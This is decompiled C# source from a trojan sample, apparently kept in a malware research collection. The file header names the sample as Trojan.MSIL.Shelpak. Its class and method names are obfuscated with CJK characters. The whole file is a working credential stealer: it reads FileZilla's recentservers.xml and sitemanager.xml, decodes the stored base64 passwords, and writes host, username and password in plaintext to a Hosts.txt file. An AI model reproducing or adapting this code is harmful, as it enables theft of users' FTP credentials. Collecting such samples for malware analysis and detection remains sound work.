// Decompiled with JetBrains decompiler
// Type: 人土乙彐火几山貝老虍鹿豕.厶鼠尸卜臼爪斤父方入攴勹手凵
// Assembly: correcthit, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 98A8C508-DCA7-4494-BD18-281291040E34
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Shelpak.gen-d9c811eae2b07eca77f74ca45e1efee2a2c91add3f8606c489f526eb43f55287.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Xml;
using 火長宀舛火尸彐方自儿丿广;

namespace 人土乙彐火几山貝老虍鹿豕
{
  internal sealed class 厶鼠尸卜臼爪斤父方入攴勹手凵
  {
    private static string[] 土毛彡肉角廾廾歹卩人走丨气()
    {
      string str = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\FileZilla\\";
      return new string[2]
      {
        str + "recentservers.xml",
        str + "sitemanager.xml"
      };
    }

    public static List<田犬聿糸亠斗口雨糸癶片入> 毛邑面尢釆牙山冫凵阜网匕尢气自()
    {
      List<田犬聿糸亠斗口雨糸癶片入> 田犬聿糸亠斗口雨糸癶片入List = new List<田犬聿糸亠斗口雨糸癶片入>();
      string[] strArray = 厶鼠尸卜臼爪斤父方入攴勹手凵.土毛彡肉角廾廾歹卩人走丨气();
      if (!File.Exists(strArray[0]) && !File.Exists(strArray[1]))
        return 田犬聿糸亠斗口雨糸癶片入List;
      foreach (string str in strArray)
      {
        try
        {
          if (File.Exists(str))
          {
            XmlDocument xmlDocument = new XmlDocument();
            xmlDocument.Load(str);
            foreach (XmlNode xmlNode in xmlDocument.GetElementsByTagName("Server"))
            {
              田犬聿糸亠斗口雨糸癶片入 田犬聿糸亠斗口雨糸癶片入 = new 田犬聿糸亠斗口雨糸癶片入();
              田犬聿糸亠斗口雨糸癶片入.巾厶氏卩斗見食襾冖門 = "ftp://" + xmlNode["Host"].InnerText + ":" + xmlNode["Port"].InnerText + "/";
              田犬聿糸亠斗口雨糸癶片入.立月尸戈豸口比土氏彡禾高 = xmlNode["User"].InnerText;
              田犬聿糸亠斗口雨糸癶片入.彡卩見广鬥殳尸八馬火鳥又彡己毛勹日 = Encoding.UTF8.GetString(Convert.FromBase64String(xmlNode["Pass"].InnerText));
              ++丿士止土巾幺山田巾弋宀小.毋聿耒片匸方亠八父寸口弋黃冖;
              田犬聿糸亠斗口雨糸癶片入List.Add(田犬聿糸亠斗口雨糸癶片入);
            }
          }
        }
        catch
        {
        }
      }
      return 田犬聿糸亠斗口雨糸癶片入List;
    }

    private static string 匸羊彐氏屮馬艸面心爻(田犬聿糸亠斗口雨糸癶片入 方片牛夊八面自立士手儿幺) => string.Format("Url: {0}\nUsername: {1}\nPassword: {2}\n\n", (object) 方片牛夊八面自立士手儿幺.巾厶氏卩斗見食襾冖門, (object) 方片牛夊八面自立士手儿幺.立月尸戈豸口比土氏彡禾高, (object) 方片牛夊八面自立士手儿幺.彡卩見广鬥殳尸八馬火鳥又彡己毛勹日);

    public static void 歹聿谷干卩穴尢爻止八鬼(List<田犬聿糸亠斗口雨糸癶片入> 牙禾廾癶皿廴犬厶日甘心, string 麻方厂比水隶非己冫戶)
    {
      if (牙禾廾癶皿廴犬厶日甘心.Count == 0)
        return;
      Directory.CreateDirectory(麻方厂比水隶非己冫戶);
      foreach (田犬聿糸亠斗口雨糸癶片入 方片牛夊八面自立士手儿幺 in 牙禾廾癶皿廴犬厶日甘心)
        File.AppendAllText(麻方厂比水隶非己冫戶 + "\\Hosts.txt", 厶鼠尸卜臼爪斤父方入攴勹手凵.匸羊彐氏屮馬艸面心爻(方片牛夊八面自立士手儿幺));
    }
  }
}
